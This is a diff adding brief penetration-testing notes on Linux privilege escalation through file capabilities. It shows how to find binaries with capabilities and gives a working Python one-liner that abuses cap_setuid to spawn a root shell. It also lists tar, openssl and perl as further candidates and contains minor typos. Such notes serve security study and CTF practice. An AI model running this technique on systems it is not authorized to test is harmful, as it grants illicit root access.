@@ -1,0 +1,16 @@
+Escalation via Capabilities:
+
+Hunting Capabilities:
+    getcap -r / 2>/devnull
+        /usr/bin/python2.6 = cap_setuid+ep  <--- ep == Permit Everything
+        /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+    Whe should now be root:
+        whoami
+
+
+     getcap -r / 2>/devnull can display other capabilities:
+        tar 
+        openssl 
+        perl
+        
